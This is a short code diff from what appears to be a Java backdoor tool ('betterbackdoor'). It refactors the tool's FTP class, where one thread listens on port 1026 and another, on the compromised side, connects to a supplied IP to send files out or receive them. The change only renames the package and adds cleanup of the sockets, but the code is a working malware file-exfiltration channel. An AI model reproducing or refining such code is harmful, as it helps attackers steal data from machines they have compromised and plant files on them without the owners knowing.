@@ -1,4 +1,4 @@
-package com.github.thatcherdev.betterbackdoor.backend;
+package com.thatcherdev.betterbackdoor.backend;
 
 import java.io.File;
 import java.io.IOException;
@@ -31,18 +31,27 @@ public class FTP {
 	public static void shell(String filePath, String protocol) {
 		Thread thread = new Thread() {
 			public void run() {
+				ServerSocketChannel serverSocketChannel = null;
+				SocketChannel socketChannel = null;
 				try {
-					ServerSocketChannel serverSocketChannel = ServerSocketChannel.open();
+					serverSocketChannel = ServerSocketChannel.open();
 					serverSocketChannel.socket().bind(new InetSocketAddress(1026));
-					SocketChannel socketChannel = serverSocketChannel.accept();
+					socketChannel = serverSocketChannel.accept();
 					if (protocol.equals("send"))
 						send(filePath, socketChannel);
 					else if (protocol.equals("rec"))
 						rec(filePath, socketChannel);
-					serverSocketChannel.close();
-					socketChannel.close();
 				} catch (Exception e) {
 					e.printStackTrace();
+				} finally {
+					try {
+						if (serverSocketChannel != null)
+							serverSocketChannel.close();
+						if (socketChannel != null)
+							socketChannel.close();
+					} catch (Exception e) {
+						e.printStackTrace();
+					}
 				}
 			}
 		};
@@ -65,9 +74,10 @@ public class FTP {
 	public static void backdoor(String filePath, String protocol, String ip) {
 		Thread thread = new Thread() {
 			public void run() {
+				SocketChannel socketChannel = null;
 				try {
 					Thread.sleep(2000);
-					SocketChannel socketChannel = SocketChannel.open();
+					socketChannel = SocketChannel.open();
 					SocketAddress socketAddress = new InetSocketAddress(ip, 1026);
 					socketChannel.connect(socketAddress);
 					if (protocol.equals("send"))
@@ -78,6 +88,13 @@ public class FTP {
 					socketTransferDone = true;
 				} catch (Exception e) {
 					e.printStackTrace();
+				} finally {
+					try {
+						if (socketChannel != null)
+							socketChannel.close();
+					} catch (Exception e) {
+						e.printStackTrace();
+					}
 				}
 			}
 		};
